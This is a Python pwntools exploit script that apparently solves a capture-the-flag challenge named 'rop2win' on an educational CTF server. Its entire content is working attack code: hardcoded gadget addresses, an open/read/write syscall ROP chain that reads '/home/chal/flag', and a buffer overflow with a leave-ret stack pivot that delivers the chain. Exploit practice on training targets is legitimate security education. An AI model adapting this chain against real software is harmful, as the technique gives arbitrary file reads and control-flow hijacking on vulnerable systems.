#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote("edu-ctf.zoolab.org",10005)
# r = process("./rop2win")

# r = gdb.debug("./rop2win", """
# b *0x42cea4
# c
# """)

fn_addr = 0x4E3340 #0x4DF460
ROP_addr = 0x4E3360# 0x4DF360
pop_rdi_ret =0x4038b3 #0x40186a
pop_rsi_ret = 0x402428  #0x4028a8
pop_rax_ret =0x45db87  #0x4607e7
pop_rdx_ret = 0x493a2b  #0x40176f  0x0000000000493a2b : pop rdx ; pop rbx ; ret
syscall_ret = 0x4284b6 #0x42cea4
leave_ret = 0x40190c   #0x401ebd

ROP = p64(0xdeadbeef)


ROP += flat(
    #open()
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,
    #read
    pop_rdi_ret, 3,
    pop_rsi_ret, fn_addr,
    pop_rdx_ret, 0x30,0x0,
    pop_rax_ret, 0,
    syscall_ret,
    #write
    pop_rdi_ret, 1,
    # pop_rsi_ret, fn_addr,
    # pop_rdx_ret, 0x20,0x0,
    pop_rax_ret, 1,
    syscall_ret,
)

r.sendafter("Give me filename: ", b"/home/chal/flag\x00")
r.sendafter("Give me ROP: ", ROP)
r.sendafter("Give me overflow: ", b'A'*0x20 + p64(ROP_addr) + p64(leave_ret))

# gdb.attach(r)

r.interactive()

